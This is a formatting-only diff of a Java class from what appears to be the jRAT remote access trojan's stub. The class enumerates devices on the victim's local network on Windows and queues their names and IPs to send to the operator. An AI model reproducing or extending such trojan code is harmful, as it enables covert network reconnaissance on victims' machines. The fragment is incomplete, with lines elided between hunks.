@@ -1,14 +1,13 @@
 package pro.jrat.stub;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.packets.outgoing.Packet49LanDevices;
 
-
-
 public class Lan extends Thread {
-	
+
 	public void run() {
 		try {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
@@ -30,8 +29,8 @@ public class Lan extends Thread {
 							ip = ip.substring(ip.indexOf("[") + 1, ip.lastIndexOf("]"));
 						}
 						preader.close();
-						
-						Connection.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip ));
+
+						Connection.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip));
 					}
 				}
 				reader.close();
